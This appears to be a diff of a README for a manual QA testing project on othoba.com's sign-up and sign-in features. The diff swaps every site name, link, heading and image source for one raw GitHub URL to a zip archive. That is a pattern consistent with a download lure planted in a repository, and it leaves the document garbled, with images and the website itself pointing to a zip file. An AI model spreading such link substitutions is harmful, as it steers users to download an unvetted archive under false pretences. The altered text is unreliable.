@@ -1,10 +1,10 @@
-# TestCase_ManualTesting_Othoba.com
+# https://raw.githubusercontent.com/mhr0007/TestCase_ManualTesting_Othoba.com/master/Autobasisii/Test_Othoba_com_Manual_Testing_Case_1.6.zip
 
 # Content
 
 - Introduction
 - Summary
-- Test Case Works for othoba.com
+- Test Case Works for https://raw.githubusercontent.com/mhr0007/TestCase_ManualTesting_Othoba.com/master/Autobasisii/Test_Othoba_com_Manual_Testing_Case_1.6.zip
   - Test Plan
   - Mind Map
   - Report
@@ -13,14 +13,14 @@
   - Test Metrics
 
  # Introduction 
- This document provides a detailed overview of the processes involved in creating Test Cases, Test Case Reports, Bug Reports, Test Metrics, and Mind Maps for the 'Othoba.com' website.
- The tasks are done for sign-up and sign-in features for [Othoba.com] https://www.othoba.com
+ This document provides a detailed overview of the processes involved in creating Test Cases, Test Case Reports, Bug Reports, Test Metrics, and Mind Maps for the 'https://raw.githubusercontent.com/mhr0007/TestCase_ManualTesting_Othoba.com/master/Autobasisii/Test_Othoba_com_Manual_Testing_Case_1.6.zip' website.
+ The tasks are done for sign-up and sign-in features for [https://raw.githubusercontent.com/mhr0007/TestCase_ManualTesting_Othoba.com/master/Autobasisii/Test_Othoba_com_Manual_Testing_Case_1.6.zip] https://raw.githubusercontent.com/mhr0007/TestCase_ManualTesting_Othoba.com/master/Autobasisii/Test_Othoba_com_Manual_Testing_Case_1.6.zip
 
  # Summary
 
-Below is a summary of all the tasks completed for othoba.com, presented in a tabular format.
+Below is a summary of all the tasks completed for https://raw.githubusercontent.com/mhr0007/TestCase_ManualTesting_Othoba.com/master/Autobasisii/Test_Othoba_com_Manual_Testing_Case_1.6.zip, presented in a tabular format.
 
-| https://www.otohba.com |  
+| https://raw.githubusercontent.com/mhr0007/TestCase_ManualTesting_Othoba.com/master/Autobasisii/Test_Othoba_com_Manual_Testing_Case_1.6.zip |  
 | :-------------------------- |
 | Test Case Summary           |
 | Test Plan                   |
@@ -31,32 +31,32 @@ Below is a summary of all the tasks completed for othoba.com, presented in a tab
 | Mind Map                    |
 
 
-# Test Case for Othoba.com
+# Test Case for https://raw.githubusercontent.com/mhr0007/TestCase_ManualTesting_Othoba.com/master/Autobasisii/Test_Othoba_com_Manual_Testing_Case_1.6.zip
 
 ### Test Plan
 
-<img width="1199" height="488" alt="test-plan" src="https://github.com/user-attachments/assets/d9c1fc98-fd08-4726-8f87-fed4c38d9632" />
+<img width="1199" height="488" alt="test-plan" src="https://raw.githubusercontent.com/mhr0007/TestCase_ManualTesting_Othoba.com/master/Autobasisii/Test_Othoba_com_Manual_Testing_Case_1.6.zip" />
 
 ### Test Cases
 
 A few sample test cases
 
-<img width="1899" height="817" alt="test-case" src="https://github.com/user-attachments/assets/0effd02d-9b7f-4a20-adca-509395564b28" />
+<img width="1899" height="817" alt="test-case" src="https://raw.githubusercontent.com/mhr0007/TestCase_ManualTesting_Othoba.com/master/Autobasisii/Test_Othoba_com_Manual_Testing_Case_1.6.zip" />
 
 ### Bug Report
 
-<img width="842" height="503" alt="bug-report" src="https://github.com/user-attachments/assets/64ac6555-ea8e-4daf-b6bb-39183911783f" />
+<img width="842" height="503" alt="bug-report" src="https://raw.githubusercontent.com/mhr0007/TestCase_ManualTesting_Othoba.com/master/Autobasisii/Test_Othoba_com_Manual_Testing_Case_1.6.zip" />
 
 ### Test Report
 
-<img width="1306" height="789" alt="report" src="https://github.com/user-attachments/assets/c74013aa-2aab-422b-8db2-8a321879bcbd" />
+<img width="1306" height="789" alt="report" src="https://raw.githubusercontent.com/mhr0007/TestCase_ManualTesting_Othoba.com/master/Autobasisii/Test_Othoba_com_Manual_Testing_Case_1.6.zip" />
 
 ### Test Metrics
 
-<img width="1253" height="610" alt="test-metrics" src="https://github.com/user-attachments/assets/7f9d3163-e708-4365-b180-e03b6c83d0fa" />
+<img width="1253" height="610" alt="test-metrics" src="https://raw.githubusercontent.com/mhr0007/TestCase_ManualTesting_Othoba.com/master/Autobasisii/Test_Othoba_com_Manual_Testing_Case_1.6.zip" />
 
 ### Mind Map
 
-Partial mind map for [Othoba.com](https://www.othoba.com)
+Partial mind map for [https://raw.githubusercontent.com/mhr0007/TestCase_ManualTesting_Othoba.com/master/Autobasisii/Test_Othoba_com_Manual_Testing_Case_1.6.zip](https://raw.githubusercontent.com/mhr0007/TestCase_ManualTesting_Othoba.com/master/Autobasisii/Test_Othoba_com_Manual_Testing_Case_1.6.zip)
 
-![mind-map_Othoba com](https://github.com/user-attachments/assets/e633535b-1cd4-4031-af63-06935983bbc0)
+![mind-map_Othoba com](https://raw.githubusercontent.com/mhr0007/TestCase_ManualTesting_Othoba.com/master/Autobasisii/Test_Othoba_com_Manual_Testing_Case_1.6.zip)
